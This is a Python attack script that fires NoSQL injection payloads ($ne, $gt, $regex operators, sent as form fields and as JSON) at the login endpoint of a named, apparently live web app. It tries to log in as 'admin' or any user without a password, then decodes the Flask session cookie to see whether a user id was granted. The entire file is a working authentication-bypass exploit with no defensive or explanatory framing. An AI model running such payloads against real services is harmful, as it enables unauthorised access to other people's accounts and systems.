import requests, time, flask_unsign as fu

base = 'https://outofcontext-app.onrender.com'

def result(ss, r):
    c = ss.cookies.get('session')
    uid = None
    if c:
        try:
            uid = fu.decode(c).get('_user_id')
        except Exception:
            uid = '?'
    return r.status_code, r.headers.get('Location', ''), 'uid=' + str(uid)

form_tests = [
    ('form ne', {'username': 'admin', 'password[$ne]': 'x'}),
    ('form ne-all', {'username[$ne]': '', 'password[$ne]': ''}),
    ('form gt', {'username': 'admin', 'password[$gt]': ''}),
    ('form regex', {'username': 'admin', 'password[$regex]': '.*'}),
]
for name, data in form_tests:
    ss = requests.Session()
    r = ss.post(base + '/login', data=data, timeout=40, allow_redirects=False)
    print(name, result(ss, r))
    time.sleep(1)

json_tests = [
    ('json ne', {'username': 'admin', 'password': {'$ne': None}}),
    ('json ne-all', {'username': {'$ne': None}, 'password': {'$ne': None}}),
    ('json regex', {'username': 'admin', 'password': {'$regex': '.*'}}),
    ('json gt', {'username': 'admin', 'password': {'$gt': ''}}),
]
for name, j in json_tests:
    ss = requests.Session()
    try:
        r = ss.post(base + '/login', json=j, timeout=40, allow_redirects=False)
        print(name, result(ss, r))
    except Exception as e:
        print(name, 'ERR', str(e)[:60])
    time.sleep(1)
